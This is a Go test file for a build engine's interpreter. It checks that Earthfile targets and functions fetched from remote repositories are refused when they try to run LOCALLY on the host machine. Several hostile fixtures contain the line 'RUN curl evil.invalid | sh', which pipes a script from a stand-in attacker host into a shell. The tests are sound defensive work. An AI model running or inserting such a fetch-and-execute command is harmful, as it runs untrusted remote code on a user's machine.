package interp_test

import (
	"strings"
	"testing"

	"github.com/EarthBuild/earthbuild/engine/interp"
)

// A remote target that runs on the host is refused.
//
// `LOCALLY` runs commands on the invoking machine, outside any sandbox. In an
// Earthfile you wrote, that is a choice you made; reached through
// `FROM github.com/org/repo+target`, it is **a command chosen by whoever can
// push to that repository, running as you** - which is why the reference
// requires `--allow-privileged` before it will build one, and why green paper
// §5.3 puts a remote reference in a different trust domain.
//
// This engine fetched and built it. `tests/allow-privileged.earth` says so in
// its own words - `RUN echo this should never run because the above FROM should
// fail` - and that RUN was reached (E439).
func TestARemoteTargetThatRunsOnTheHostIsRefused(t *testing.T) {
	t.Parallel()

	for _, tc := range []struct{ name, line string }{
		{"FROM", "    FROM github.com/org/repo+dangerous\n"},
		{"COPY", "    FROM alpine:3.22\n    COPY github.com/org/repo+dangerous/x .\n"},
		{"BUILD", "    FROM alpine:3.22\n    BUILD github.com/org/repo+dangerous\n"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()

			f := hostileRemote(t)

			_, err := interp.Build(versioned+"\nmain:\n"+tc.line,
				testMain, interp.WithRemotes(f.fetch))
			if err == nil {
				t.Fatal("a remote target running LOCALLY was built" +
					"\n  the repository's author chose that command and this" +
					" machine ran it")
			}

			// Named, because the reader has to be able to tell this refusal
			// from the ordinary "LOCALLY is not supported here": one is about
			// what the engine can do and this one is about who wrote it.
			if !strings.Contains(err.Error(), "github.com/org/repo") {
				t.Errorf("refused with %q, which does not name the repository"+
					" whose target it was", err)
			}
		})
	}
}

// The refusal is about *remoteness*, not about the command.
//
// A LOCALLY in the Earthfile in front of you is yours to write, and this engine
// runs it. Asserted alongside, because a check that refuses both is not a trust
// boundary - it is a missing feature with a security-shaped explanation.
func TestALocalTargetMayStillRunOnTheHost(t *testing.T) {
	t.Parallel()

	_, err := interp.Build(versioned+
		"\nmain:\n    LOCALLY\n    RUN echo mine\n", testMain)
	if err != nil {
		t.Fatalf("a LOCALLY in this Earthfile was refused: %v", err)
	}
}

// hostileRemote is a checkout whose target runs on the host.
func hostileRemote(t *testing.T) *fetcher {
	t.Helper()

	return &fetcher{dir: ctxWith(t, map[string]string{
		testEarthfile: versioned +
			"\ndangerous:\n    LOCALLY\n    RUN curl evil.invalid | sh\n" +
			"    SAVE ARTIFACT /etc/hostname x\n",
	})}
}

// A remote *function* cannot smuggle it in either.
//
// `DO github.com/org/repo+FN` runs another file's commands inside this target,
// which is the shape a check on the target alone would miss: the LOCALLY is in
// their file and the target is in yours. Provenance follows the commands, not
// the target that hosts them.
func TestARemoteFunctionCannotRunOnTheHostEither(t *testing.T) {
	t.Parallel()

	f := &fetcher{dir: ctxWith(t, map[string]string{
		testEarthfile: versioned +
			"\nFN:\n    FUNCTION\n    LOCALLY\n    RUN curl evil.invalid | sh\n",
	})}

	_, err := interp.Build(versioned+
		"\nmain:\n    FROM alpine:3.22\n    DO github.com/org/repo+FN\n",
		testMain, interp.WithRemotes(f.fetch))
	if err == nil {
		t.Fatal("a remote function ran LOCALLY on this machine")
	}

	// The refusal has to be *this* one. A reference names the repository, so a
	// message mentioning it proves nothing on its own - "no Earthfile there"
	// would pass a substring check just as well, and the test would be green for
	// a build that never reached the function.
	if !strings.Contains(err.Error(), "LOCALLY") {
		t.Errorf("refused with %q, which is not the host-execution refusal", err)
	}
}

// And a local Earthfile beside a fetched one is still local.
//
// The refusal follows the file the command is written in, so a build that
// *refers* to a repository does not lose the right to run its own host
// commands - a check that leaked the other way would refuse ordinary builds and
// be turned off within a week.
func TestReferringToARemoteDoesNotTaintTheLocalFile(t *testing.T) {
	t.Parallel()

	f := remoteRepo(t, "")

	_, err := interp.Build(versioned+
		"\nmain:\n    FROM github.com/org/repo+build\n    LOCALLY\n    RUN mine\n",
		testMain, interp.WithRemotes(f.fetch))
	if err != nil {
		t.Fatalf("a LOCALLY in this Earthfile was refused for referring to a"+
			" repository: %v", err)
	}
}

// Provenance reaches the whole checkout, not just the file that was named.
//
// A fetched Earthfile may refer to another directory of the same repository -
// that is what `confinedTo` permits, and it is ordinary. The second file is just
// as fetched, however local its own reference looked, so the `LOCALLY` moves one
// directory across and the refusal has to move with it.
//
// The line that carries it had no witness until the mutation sweep deleted it
// and nothing failed (E439).
func TestProvenanceReachesTheWholeCheckout(t *testing.T) {
	t.Parallel()

	f := &fetcher{dir: ctxWith(t, map[string]string{
		testEarthfile: versioned + "\nouter:\n    FROM ./sub+inner\n",
		"sub/" + testEarthfile: versioned +
			"\ninner:\n    LOCALLY\n    RUN curl evil.invalid | sh\n",
	})}

	_, err := interp.Build(versioned+
		"\nmain:\n    FROM github.com/org/repo+outer\n",
		testMain, interp.WithRemotes(f.fetch))
	if err == nil {
		t.Fatal("a second Earthfile in the fetched checkout ran LOCALLY")
	}

	if !strings.Contains(err.Error(), "LOCALLY") {
		t.Errorf("refused with %q, which is not the host-execution refusal", err)
	}
}
